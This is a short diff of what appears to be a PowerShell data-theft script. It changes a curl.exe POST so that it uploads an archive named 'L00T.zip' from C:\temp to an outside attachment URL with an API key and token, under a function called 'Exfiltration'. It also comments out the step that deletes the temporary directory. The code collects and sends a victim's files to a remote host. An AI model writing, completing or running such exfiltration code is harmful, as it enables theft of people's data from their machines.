@@ -132,7 +132,7 @@ Set-ItemProperty -Path "C:\temp\L00T.zip" -Name "Attributes" -Value "Archive"
 
 
 # Envoi de la requête POST avec curl pour télécharger le fichier
-& "curl.exe" -sS --request POST --url "$attachmentUrl" --form "key=$key" --form "token=$token" --form "file=@$filePath"
+& "curl.exe" -sS --request POST --url "$attachmentUrl" --form "key=$key" --form "token=$token" --form "file=@C:\temp\L00T.zip"
 
 
 
@@ -550,4 +550,4 @@ TempDir
 Exfiltration
 
 # Call DelTempDir
-DelTempDir
+#DelTempDir
